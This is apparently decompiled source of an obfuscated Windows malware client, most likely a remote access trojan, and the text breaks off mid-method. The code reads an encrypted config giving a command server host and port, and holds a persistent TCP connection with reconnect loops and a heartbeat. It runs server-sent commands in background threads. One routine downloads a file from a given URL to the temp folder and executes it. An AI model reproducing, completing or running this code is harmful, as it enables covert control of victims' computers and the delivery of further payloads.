using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

[StandardModule]
public sealed class ______________________________________________________________
{
	private delegate void _______________________________________________________________(string string_0);

	internal class ________________________________________________________________
	{
		public ______________________________________________________________________ _;

		[SpecialName]
		[DebuggerStepThrough]
		public void _()
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			((Form)this._).ShowDialog();
		}
	}

	public static TcpClient __;

	public static StreamWriter ___;

	public static bool ____;

	public static StreamReader _____;

	private static _______________________________________________________________ m_______;

	public static bool _______;

	public static bool ________;

	private static bool m__________;

	public static bool __________;

	private static int m____________;

	private static FileStream m_____________;

	public static string _____________;

	public static int ______________;

	public static string _______________;

	public static string ________________;

	public static string _________________;

	public static string __________________;

	public static string ___________________;

	public static string ____________________;

	public static string[] _____________________;

	public static bool ______________________;

	public static string _______________________;

	public static string ________________________;

	public static bool _________________________;

	public static Mutex __________________________;

	public static bool ___________________________;

	public static bool ____________________________;

	private static event _______________________________________________________________ _
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			______________________________________________________________.m_______ = (_______________________________________________________________)Delegate.Combine(______________________________________________________________.m_______, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			______________________________________________________________.m_______ = (_______________________________________________________________)Delegate.Remove(______________________________________________________________.m_______, value);
		}
	}

	unsafe static ______________________________________________________________()
	{
		______________________________________________________________._ = new Thread(_________);
		______________________________________________________________.____ = false;
		int num = -18910;
		switch (sizeof(ulong))
		{
		}
		do
		{
			______________________________________________________________._______ = false;
			______________________________________________________________.________ = false;
			______________________________________________________________.m__________ = false;
			______________________________________________________________.__________ = false;
		}
		while (num != -18910);
		______________________________________________________________.m____________ = 0;
		nint num2 = (nint)Type.EmptyTypes.LongLength + 10054;
		int num3 = _003CModule_003E.___________;
		int num4 = _003CModule_003E.________________;
		nint num6;
		if (((uint)(num3 + 385 * num4 + num3 * 3 + num4 * 127) & (true ? 1u : 0u)) != 0)
		{
			int num5 = default(int);
			num6 = ((((14 * ((uint)num5 / 262144u) + 2 * ((uint)num5 / 262144u)) ^ 0x10012A1u) != 0) ? ((nint)Type.EmptyTypes.LongLength + -1670853533) : ((nint)Type.EmptyTypes.LongLength + 2028017545));
		}
		else
		{
			int num5 = 250;
			num6 = num5;
		}
		______________________________________________________________._______________ = _003CModule_003E.__________((int)num2, 11783, (int)num6);
		______________________________________________________________.______________________ = false;
		______________________________________________________________._______________________ = _003CModule_003E.______<string>(3058521720u);
		______________________________________________________________.________________________ = _003CModule_003E._______<string>(2127844380u);
		_________________________ = false;
		______________________________________________________________.___________________________ = false;
		______________________________________________________________.____________________________ = false;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public unsafe static void ___()
	{
		try
		{
			string text = ___________________________________________________________________._(__________________________________________________________________________._____.Trim(), _003CModule_003E.____<string>(668638760u));
			text = text.Trim();
			______________________________________________________________._____________________ = Strings.Split(text, _003CModule_003E._______<string>(1023697363u), -1, (CompareMethod)0);
			nint num = sizeof(uint) + -2;
			while (true)
			{
				switch (num)
				{
				default:
					______________________________________________________________._____________ = ______________________________________________________________._____________________[0];
					______________________________________________________________.______________ = Convert.ToInt32(______________________________________________________________._____________________[1]);
					num = (nint)Type.EmptyTypes.LongLength + 0;
					continue;
				case 0:
					______________________________________________________________._______________ = ______________________________________________________________._____________________[2];
					______________________________________________________________.________________ = ______________________________________________________________._____________________[3];
					num = sizeof(short) + -1;
					continue;
				case 1:
					______________________________________________________________._________________ = ______________________________________________________________._____________________[4];
					______________________________________________________________.__________________ = ______________________________________________________________._____________________[5];
					______________________________________________________________.___________________ = ______________________________________________________________._____________________[6];
					______________________________________________________________.____________________ = ______________________________________________________________._____________________[7];
					if (!______________________________________________________________.___________________.Contains(_003CModule_003E._____<string>(585574209u)))
					{
						______________________________________________________________.___________________________ = true;
					}
					break;
				}
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Thread.Sleep(-1);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (______________________________________________________________.___________________.Contains(_003CModule_003E.___<string>(2940146034u)) && ___________________________________________________________________.______())
			{
				_____();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			_____________________________________________________________________________.__ = Application.get_ExecutablePath();
			__________________________________________________________________._();
			global::______________________.__();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(______________________________________________________________._________________, _003CModule_003E._______<string>(1177340789u), false) != 0)
		{
			_____________________________________________________________________________.________();
		}
		if (____(______________________________________________________________.__________________))
		{
			ProjectData.EndApp();
		}
		______();
	}

	public static bool ____(string string_0)
	{
		try
		{
			__________________________ = new Mutex(initiallyOwned: false, _003CModule_003E.______<string>(3336824671u) + string_0);
			switch ((nint)Type.EmptyTypes.LongLength + 0)
			{
			default:
				if (!__________________________.WaitOne(0, exitContext: false))
				{
					__________________________.Close();
					__________________________ = null;
					return true;
				}
				______________________________________________________________.______________________ = true;
				return false;
			}
		}
		catch (UnauthorizedAccessException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			bool result = true;
			ProjectData.ClearProjectError();
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void _____()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 109:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 5:
							goto IL_001f;
						case 3:
						case 4:
						case 6:
							goto IL_0026;
						case 7:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_001f:
					num = 5;
					num5++;
					goto IL_0026;
					IL_0007:
					num = 2;
					num5 = 1;
					switch ((nint)Type.EmptyTypes.LongLength + 0)
					{
					}
					goto IL_0026;
					IL_0026:
					num = 4;
					if (num5 == 100000)
					{
						break;
					}
					goto IL_001f;
					end_IL_0000_2:
					break;
				}
				num = 7;
				_____();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 109;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ______()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Thread thread = default(Thread);
		int num5 = default(int);
		Thread thread2 = default(Thread);
		Thread thread3 = default(Thread);
		Thread thread4 = default(Thread);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num6;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 443:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002f;
						case 4:
							goto IL_006e;
						case 5:
							goto IL_0076;
						case 6:
							goto IL_00cb;
						case 7:
							goto IL_00e5;
						case 8:
							goto IL_00ed;
						case 9:
							goto IL_0102;
						case 10:
							goto IL_010c;
						case 11:
							goto IL_0122;
						case 12:
							goto IL_012c;
						case 13:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 14:
						case 15:
						case 16:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_010c:
					num = 10;
					thread = new Thread(global::______________________._____);
					goto IL_0122;
					IL_0008:
					num = 2;
					______________________________________________________________._.Start();
					num5 = (int)((nint)Type.EmptyTypes.LongLength + 28966);
					num6 = sizeof(ulong) + -6;
					goto IL_00b5;
					IL_00b5:
					switch (num6)
					{
					case 2:
						break;
					default:
						goto IL_0035;
					case 0:
						goto IL_00cb;
					case 1:
						goto IL_0102;
					}
					goto IL_002f;
					IL_00cb:
					num5 = 28211;
					num = 6;
					thread2 = new Thread(global::_______________________._);
					goto IL_00e5;
					IL_00e5:
					num = 7;
					thread2.Start();
					goto IL_00ed;
					IL_00ed:
					num = 8;
					thread3 = new Thread(global::________________________._);
					goto IL_0102;
					IL_002f:
					num5 = 28966;
					goto IL_0035;
					IL_0035:
					num = 3;
					thread4 = new Thread(_______);
					if (num5 != -32216 || -352232712 + (num << 3) == 43288 * num + 9974)
					{
						goto IL_006e;
					}
					goto IL_0102;
					IL_0102:
					num = 9;
					thread3.Start();
					goto IL_010c;
					IL_006e:
					num = 4;
					thread4.Start();
					goto IL_0076;
					IL_0076:
					num = 5;
					_______________________________________.___();
					num5 = (((((uint)num5 / 268435456u) | 0x1B4F) == 6991) ? (sizeof(float) + 28207) : (sizeof(short) + -2108587613));
					num6 = sizeof(Guid) + -16;
					goto IL_00b5;
					IL_0122:
					num = 11;
					thread.Start();
					goto IL_012c;
					IL_012c:
					num = 12;
					if (______________________________________________________________.___________________.Contains(_003CModule_003E.___<string>(1468083866u)))
					{
						goto end_IL_0000_3;
					}
					break;
					end_IL_0000_2:
					break;
				}
				num = 13;
				_____________________________________________________________ ____________________________________________________________2 = new _____________________________________________________________();
				try
				{
					Application.Run((Form)(object)____________________________________________________________2);
				}
				finally
				{
					((IDisposable)____________________________________________________________2)?.Dispose();
				}
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 443;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void _______()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		System.Timers.Timer timer = default(System.Timers.Timer);
		Thread thread = default(Thread);
		string text = default(string);
		string text2 = default(string);
		int num8 = default(int);
		int num10 = default(int);
		int num12 = default(int);
		Thread thread2 = default(Thread);
		System.Timers.Timer timer3 = default(System.Timers.Timer);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num5;
				nint num6;
				System.Timers.Timer timer2;
				int num7;
				int num9;
				int num14;
				AppDomain currentDomain;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 1857:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 30:
							goto IL_0066;
						case 31:
							goto IL_0090;
						case 43:
							goto IL_00d7;
						case 44:
							goto IL_00e2;
						case 32:
							goto IL_016c;
						case 36:
							goto IL_0283;
						case 37:
							goto IL_02cb;
						case 24:
						case 25:
							goto IL_02de;
						case 27:
						case 28:
							goto IL_0304;
						case 29:
							goto IL_030d;
						case 38:
						case 39:
							goto IL_031f;
						case 40:
							goto IL_033d;
						case 41:
						case 42:
							goto IL_0346;
						case 19:
							goto IL_0372;
						case 20:
							goto IL_0389;
						case 21:
							goto IL_039d;
						case 18:
							goto IL_03c4;
						case 22:
							goto IL_03d8;
						case 23:
							goto IL_03e1;
						case 5:
							goto IL_03f3;
						case 6:
							goto IL_040a;
						case 7:
						case 8:
							goto IL_045d;
						case 9:
							goto IL_0467;
						case 10:
							goto IL_048d;
						case 11:
							goto IL_04a0;
						case 14:
						case 15:
							goto IL_04d0;
						case 3:
							goto IL_051b;
						case 4:
							goto IL_052f;
						case 26:
							goto IL_057c;
						case 16:
							goto IL_058a;
						case 17:
							goto IL_0595;
						case 33:
						case 34:
						case 35:
							goto IL_05c1;
						case 45:
							goto IL_0604;
						case 46:
							goto IL_0618;
						case 47:
						case 48:
							goto IL_0623;
						case 49:
							goto IL_0644;
						default:
							goto end_IL_0000;
						case 12:
						case 13:
						case 50:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00d7:
					num = 43;
					timer = new System.Timers.Timer();
					goto IL_00e2;
					IL_0007:
					num = 2;
					AppDomain.CurrentDomain.AssemblyResolve += _______________________;
					num5 = sizeof(ushort) + 5;
					num6 = num5;
					goto IL_0028;
					IL_0028:
					switch (num5)
					{
					case 11:
						break;
					case 10:
						goto IL_024a;
					case 9:
						goto IL_0283;
					case 6:
						goto IL_02d8;
					case 0:
						goto IL_0389;
					case 5:
						goto IL_03c4;
					case 8:
						goto IL_048d;
					default:
						goto IL_051b;
					case 3:
						goto IL_0570;
					case 2:
						goto IL_057c;
					case 1:
						goto IL_058a;
					case 4:
						goto IL_0604;
					case 12:
						goto end_IL_0000_3;
					}
					goto IL_00bf;
					IL_0604:
					num = 45;
					timer.Interval = 120000.0;
					goto IL_0618;
					IL_0618:
					num = 46;
					timer.Start();
					goto IL_0623;
					IL_058a:
					num = 16;
					thread.Start();
					goto IL_0595;
					IL_0595:
					num = 17;
					if (Operators.CompareString(______________________________________________________________._________________, _003CModule_003E._____<string>(3717744333u), false) != 0)
					{
						num6 = (nint)Type.EmptyTypes.LongLength + 5;
						goto IL_0028;
					}
					goto IL_02de;
					IL_00e2:
					num = 44;
					timer2 = timer;
					_003CModule_003E._________ = text;
					timer2.Elapsed += ____________________________;
					num7 = _003CModule_003E.__________;
					num6 = ((((uint)(-(num7 << 20) ^ ((num3 * 622 + num3 * 402) * 2)) & 0x480u) != 0) ? (sizeof(ulong) + -2114781929) : ((1930 * num + 118 * num == -1697271203) ? ((nint)Type.EmptyTypes.LongLength + 764690478) : ((nint)Type.EmptyTypes.LongLength + 4)));
					goto IL_0028;
					IL_057c:
					num = 26;
					____________________________________________________________.______();
					goto IL_0304;
					IL_0570:
					text2 = ______________________________________________________________.___________________;
					goto IL_045d;
					IL_051b:
					num = 3;
					text2 = __________________________________________________________________.____(_003CModule_003E._____<string>(2115722719u));
					goto IL_052f;
					IL_052f:
					num = 4;
					num8 = (int)((nint)Type.EmptyTypes.LongLength + 32436);
					num6 = (((1 & (-num2 - (88566037 + -num2))) != 1) ? ((nint)Type.EmptyTypes.LongLength + 2123202231) : (sizeof(short) + 8));
					goto IL_0028;
					IL_05c1:
					num = 35;
					text = __________________________________________________________________.____(_003CModule_003E.______<string>(2229442060u));
					num8 = -24281;
					num9 = global::___________._;
					if ((((int)((uint)num9 % 117u) - -9776) & -4608) == 9728)
					{
						if (num10 - (-2052786618 ^ num10) == -5381)
						{
							if ((8 & (num10 << 3)) == (8 & (3 * num10 + 5 * num10 - 4250)))
							{
								int num11 = global::______________________._______;
								num6 = ((((uint)(2 * num11 + num11 * 2) ^ 0x1A77u) != 0) ? ((((-(538 * num + num * 486) + -1555922944 * num) ^ 0x1F6A) == 0) ? (sizeof(byte) + -2120800735) : ((nint)Type.EmptyTypes.LongLength + -1290926091)) : ((nint)Type.EmptyTypes.LongLength + 1255623367));
							}
							else
							{
								num6 = (nint)Type.EmptyTypes.LongLength + -1308233337;
							}
						}
						else
						{
							num6 = (nint)Type.EmptyTypes.LongLength + 9;
						}
					}
					else
					{
						num6 = sizeof(ushort) + 1331665118;
					}
					goto IL_0028;
					IL_04a0:
					num = 11;
					num12 = _003CModule_003E.____________;
					if (((num12 * 67108864) & 0x3FFF665) == 0)
					{
						break;
					}
					num6 = (nint)Type.EmptyTypes.LongLength + 1327412084;
					goto IL_0028;
					IL_024a:
					if (Operators.CompareString(text2, _003CModule_003E.__________(22372, sizeof(byte) + 24125, 234), false) == 0)
					{
						if (num8 != 32436)
						{
							goto IL_0283;
						}
						goto IL_03f3;
					}
					goto IL_045d;
					IL_00bf:
					if (text2.Contains(_003CModule_003E._______<string>(1122568241u)))
					{
						goto IL_0066;
					}
					goto IL_05c1;
					IL_0283:
					num8 = -24281;
					num = 36;
					if (Operators.CompareString(text, _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 29502), (int)((nint)Type.EmptyTypes.LongLength + 29241), sizeof(short) + 208), false) != 0)
					{
						if (num8 != 28058)
						{
							goto IL_02cb;
						}
						goto IL_02d8;
					}
					goto IL_031f;
					IL_04d0:
					num = 15;
					thread = new Thread(_____________________________________________________________________________.___);
					if ((0x1000F87u ^ ((uint)num3 % 1048576u)) != 0)
					{
						int num13 = 1;
						num6 = num13;
					}
					else
					{
						num6 = (nint)Type.EmptyTypes.LongLength + 1883885173;
					}
					goto IL_0028;
					IL_02cb:
					num = 37;
					______________________________________________________________._______________ = text;
					goto IL_031f;
					IL_02d8:
					______________________________________________________________.____ = true;
					goto IL_02de;
					IL_02de:
					num = 25;
					if (text2.Contains(_003CModule_003E.______<string>(417590602u)))
					{
						num6 = 2;
						goto IL_0028;
					}
					goto IL_0304;
					IL_0467:
					num = 9;
					num8 = -6119;
					if (Operators.CompareString(______________________________________________________________._________________, _003CModule_003E.______<string>(2363746648u), false) == 0)
					{
						goto end_IL_0000_2;
					}
					goto IL_048d;
					IL_0304:
					num = 28;
					______________________________________________________________________________.____();
					goto IL_030d;
					IL_030d:
					num = 29;
					num6 = (nint)Type.EmptyTypes.LongLength + 11;
					goto IL_0028;
					IL_031f:
					num = 39;
					if (text2.Contains(_003CModule_003E.___<string>(1972471017u)))
					{
						num8 = 9970;
						goto IL_033d;
					}
					goto IL_0346;
					IL_045d:
					num = 8;
					if (___________________________________________________________________.______())
					{
						goto IL_0467;
					}
					goto IL_04d0;
					IL_033d:
					num = 40;
					global::_________________________._____();
					goto IL_0346;
					IL_0346:
					num = 42;
					if (______________________________________________________________.____)
					{
						num8 = 23842;
						if ((~((uint)num2 % 8388608u) | 0x84FFFFFFu) == uint.MaxValue)
						{
							goto IL_00d7;
						}
						goto IL_03c4;
					}
					goto IL_0623;
					IL_0090:
					num = 31;
					thread2 = new Thread(________________________________________________________________________________._);
					num8 = 18028;
					if ((((uint)num12 / 2u) ^ 0xFFFFDAC7u) == 0)
					{
						goto IL_00bf;
					}
					goto IL_016c;
					IL_03c4:
					num = 18;
					timer3 = new System.Timers.Timer();
					goto IL_0372;
					IL_0372:
					num = 19;
					timer3.Elapsed += ___________________________;
					goto IL_0389;
					IL_0389:
					num = 20;
					timer3.Interval = 5000.0;
					goto IL_039d;
					IL_039d:
					num = 21;
					num8 = -6648;
					num14 = _003CModule_003E._________________;
					if ((2 & -(3 * num14 + num14)) != (int)(2 & ((uint)num14 / 827u >> 25)))
					{
						goto IL_03c4;
					}
					timer3.Start();
					goto IL_03d8;
					IL_016c:
					num = 32;
					thread2.Start();
					goto IL_05c1;
					IL_03d8:
					num = 22;
					_________________________________________________________________._();
					goto IL_03e1;
					IL_03e1:
					num = 23;
					num6 = sizeof(double) + -2;
					goto IL_0028;
					IL_0623:
					num = 48;
					currentDomain = AppDomain.CurrentDomain;
					____________________________________________________________________________._ = thread2;
					currentDomain.UnhandledException += _____________________________;
					goto IL_0644;
					IL_0644:
					num = 49;
					Thread.Sleep(-1);
					goto end_IL_0000_2;
					IL_03f3:
					num = 5;
					__________________________________________________________________._____(_003CModule_003E.______<string>(2486069650u), ______________________________________________________________.___________________);
					goto IL_040a;
					IL_040a:
					num = 6;
					num6 = ((-(-268435456 * num3) == -9119) ? (-1270050446) : (((-1052523261 ^ (9417 + (num8 << 20))) == 0) ? ((nint)Type.EmptyTypes.LongLength + 2145487941) : ((nint)Type.EmptyTypes.LongLength + 3)));
					goto IL_0028;
					IL_048d:
					num = 10;
					_____________________________________________________________________________.__(_003CModule_003E._____<string>(1392149989u));
					goto IL_04a0;
					IL_0066:
					num = 30;
					num8 = -27042;
					if ((nint)Type.EmptyTypes.LongLength + 15388 != 15388)
					{
						goto IL_00d7;
					}
					if (!______________________________________________________________.___________________________)
					{
						goto IL_0090;
					}
					goto IL_05c1;
					end_IL_0000_3:
					break;
				}
				_____________________________________________________________________________.__(_003CModule_003E._____<string>(151820431u));
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1857;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ________()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 196:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_004e;
						case 6:
						case 7:
						case 8:
							goto IL_005a;
						case 9:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 5:
						case 10:
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_005a:
					num = 8;
					if (Operators.CompareString(__________________________________________________________________.____(_003CModule_003E.___<string>(561018453u)), _003CModule_003E._______<string>(1847964473u), false) != 0)
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0008:
					num = 2;
					if (__________________________________________________________________.____(_003CModule_003E._______<string>(878090607u)).Contains(_003CModule_003E.____<string>(425164776u)))
					{
						goto IL_002a;
					}
					goto IL_005a;
					IL_002a:
					num = 3;
					if (Operators.CompareString(__________________________________________________________________.____(_003CModule_003E.______<string>(2365711259u)), _003CModule_003E.___<string>(1266744735u), false) != 0)
					{
						goto IL_004e;
					}
					goto IL_005a;
					IL_004e:
					num = 4;
					_________________________________________________._____();
					goto end_IL_0000_3;
					end_IL_0000_2:
					break;
				}
				num = 9;
				_________________________________________________._____();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 196;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void _________()
	{
		int num = default(int);
		while (true)
		{
			try
			{
				do
				{
					__ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
					if (!______________________________________________________________.m__________)
					{
						______________________________________________________________.m__________ = true;
						switch ((nint)Type.EmptyTypes.LongLength + 0)
						{
						default:
							__.ReceiveTimeout = 120000;
							__.SendTimeout = 120000;
							break;
						}
					}
					___________(string.Format(_003CModule_003E.___<string>(500408849u) + ___________________()));
				}
				while ((-877461504 & num) != (num & -877461504));
				_________________________ = true;
				if (!______________________________________________________________._______)
				{
					______________________________________________________________._______ = true;
					Thread thread = new Thread(_______________);
					thread.Start();
				}
				if (!______________________________________________________________.________)
				{
					______________________________________________________________.________ = true;
					_ += _____________________;
				}
				__.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, ________________, null);
				break;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					if (Operators.CompareString(______________________________________________________________._______________, _003CModule_003E._____<string>(3717744333u), false) != 0)
					{
						if (Operators.CompareString(______________________________________________________________._____________, ______________________________________________________________._____________________[0], false) == 0)
						{
							______________________________________________________________._____________ = ______________________________________________________________._______________;
						}
						else
						{
							______________________________________________________________._____________ = ______________________________________________________________._____________________[0];
						}
					}
					__.Close();
					_________________________ = false;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(12000);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void __________(string string_0)
	{
		try
		{
			______________________________________________________________.___ = new StreamWriter(__.GetStream());
			______________________________________________________________.___.WriteLine(string_0);
			______________________________________________________________.___.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________(string string_0)
	{
		try
		{
			if (__.Connected)
			{
				______________________________________________________________.___ = new StreamWriter(__.GetStream());
				______________________________________________________________.___.WriteLine(_003CModule_003E.______<string>(1712386938u) + ___________________________________________________________________.__(string_0));
				______________________________________________________________.___.Flush();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____________(string string_0)
	{
		try
		{
			___________(_003CModule_003E.___<string>(2295029356u) + string_0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____________(string string_0)
	{
		try
		{
			______________________________________________________________.___ = new StreamWriter(__.GetStream());
			______________________________________________________________.___.WriteLine(_003CModule_003E.___<string>(53750159u) + string_0);
			______________________________________________________________.___.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ______________(string string_0, string string_1)
	{
		try
		{
			if (!__________________________________________________________________.____(_003CModule_003E.___<string>(2160535770u)).Contains(_003CModule_003E.___<string>(2214909433u)))
			{
				return;
			}
			nint num = sizeof(ulong) + -8;
			string[] array = default(string[]);
			int num2 = default(int);
			while (true)
			{
				switch (num)
				{
				case 1:
					array[1] = string_0;
					array[2] = _003CModule_003E.______<string>(861631917u);
					if (num2 != -15898)
					{
					}
					array[3] = ______________________________________________________________.________________________;
					array[4] = _003CModule_003E._____<string>(1052623516u);
					array[5] = string_1;
					array[6] = _003CModule_003E.___<string>(2677394803u);
					___________(string.Concat(array));
					return;
				}
				array = new string[7]
				{
					_003CModule_003E._____<string>(3302446156u),
					null,
					null,
					null,
					null,
					null,
					null
				};
				num2 = sizeof(long) + -15906;
				num = (nint)Type.EmptyTypes.LongLength + 1;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void _______________()
	{
		while (true)
		{
			try
			{
				___________(_003CModule_003E.______<string>(2180132865u));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(60000);
		}
	}

	public static void ________________(IAsyncResult iasyncResult_0)
	{
		try
		{
			______________________________________________________________._____ = new StreamReader(__.GetStream());
			______________________________________________________________.m_______?.Invoke(___________________________________________________________________.___(______________________________________________________________._____.ReadLine()));
			__.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, ________________, null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			while (______________________________________________________________.____________________________)
			{
				Thread.Sleep(1000);
			}
			_________________________ = false;
			Thread.Sleep(12000);
			try
			{
				__.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			_________();
			ProjectData.ClearProjectError();
		}
	}

	public static void _________________(string string_0, string string_1, int int_0, int int_1)
	{
		try
		{
			_____________________________________ ____________________________________2 = new _____________________________________();
			____________________________________2.__ = string_0;
			____________________________________2.___ = string_1;
			____________________________________2.____ = int_0;
			____________________________________2._____ = int_1;
			Thread thread = new Thread(____________________________________2.________);
			thread.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void __________________(string string_0, string string_1, bool bool_0)
	{
		try
		{
			string text = default(string);
			if (-15688 == sizeof(double) + -15696)
			{
				WebClient webClient = new WebClient();
				text = Path.GetTempPath() + string_1;
				if (File.Exists(text))
				{
					______________(_003CModule_003E._____<string>(1464211711u), _003CModule_003E.______<string>(30716926u) + string_1);
					return;
				}
				switch ((nint)Type.EmptyTypes.LongLength + 1)
				{
				default:
					webClient.DownloadData(string_0);
					webClient.DownloadFile(string_0, text);
					break;
				case 0:
					break;
				}
			}
			Process.Start(text);
			if (bool_0)
			{
				______________(_003CModule_003E.______<string>(2043928306u), _003CModule_003E._____<string>(2721047570u) + text);
				_____________________________________________________________________________.____________();
			}
			else
			{
				______________(_003CModule_003E._______<string>(2721646351u), _003CModule_003E._______<string>(2843225781u) + text);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________(_003CModule_003E._______<string>(2357608790u), _003CModule_003E.____<string>(2595474110u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static string ___________________()
	{
		string result = default(string);
		try
		{
			string text = ______________________________________________________________.________________________ + _003CModule_003E.______<string>(861631917u);
			text += _003CModule_003E.______<string>(1309731734u);
			try
			{
				text += _003CModule_003E.______<string>(2630197293u);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				text += _003CModule_003E.______<string>(2630197293u);
